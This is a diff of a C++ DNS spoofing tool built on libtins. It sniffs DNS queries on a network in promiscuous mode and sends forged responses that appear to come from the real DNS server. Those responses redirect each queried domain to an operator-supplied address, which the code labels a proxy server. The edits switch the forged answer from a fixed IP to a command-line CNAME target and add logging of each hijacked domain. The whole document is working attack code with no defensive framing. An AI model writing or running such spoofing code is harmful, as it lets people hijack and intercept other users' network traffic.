@@ -3,11 +3,9 @@
 #include <pcap.h>
 #include <arpa/inet.h>
 #include <string>
-#include <memory.h>
 
 using namespace Tins;
 using namespace std;
-
 
 void Call_Device(char **C_dev);
 char *dev;
@@ -18,7 +16,6 @@ char buf[65000];
 char Select_device[10];
 char errbuf[PCAP_ERRBUF_SIZE];
 PacketSender sender;
-
 
 int main(int argc, char *argv[])
 {
@@ -45,6 +42,8 @@ int main(int argc, char *argv[])
     // libtins
 
     SnifferConfiguration config;
+    //SnifferConfiguration :: set_immediate_mode
+    config.set_immediate_mode(true);
     config.set_promisc_mode(true);
     config.set_filter("udp and dst port 53"); //dst port 53
     Sniffer sniffer(dev,config);
@@ -68,6 +67,7 @@ int main(int argc, char *argv[])
             {
                 if (query.query_type() == DNS::A)
                 {
+
                     spoof_eth.dst_addr(eth.src_addr()); // spoof_eth.dst_addr --> Gate addr
                     spoof_eth.src_addr(eth.dst_addr()); //spoof_eth.src_addr --> My addr
                     spoof_eth.payload_type(eth.payload_type());
@@ -80,6 +80,8 @@ int main(int argc, char *argv[])
 
                     spoof_ip.src_addr(ip.dst_addr()); // spoof_ip.src_addr --> DNS server addr
                     spoof_ip.dst_addr(ip.src_addr()); // spoof_ip.dst_addr --> My addr
+                    //spoof_ip.id(0);
+                    //spoof_ip.ttl(64);
 
                     //cout<<hex<<spoof_ip.src_addr()<<"\n";
                     //cout<<hex<<spoof_ip.dst_addr()<<"\n";
@@ -94,14 +96,14 @@ int main(int argc, char *argv[])
 
                     spoof_dns = dns;
 
-
-                    spoof_dns.add_answer(DNS::Resource(query.dname(),"10.100.111.169",DNS::A,query.query_class(),777));
+                    spoof_dns.add_answer(DNS::Resource(query.dname(),argv[1],DNS::CNAME,query.query_class(),777));
 
                     //cout<<spoof_dns.answers_count()<<"\n";
                    // cout<<query.dname()<<"\n";
 
                     if (spoof_dns.answers_count() > 0)
                     {
+                        cout<<"[Domain Name]: "<<query.dname()<<"\n[Send to Proxy Server]: "<<"("<<argv[1]<<")"<<"\n\n";
                         spoof_dns.type(DNS::RESPONSE);
 
                         spoof_dns.recursion_available(1);
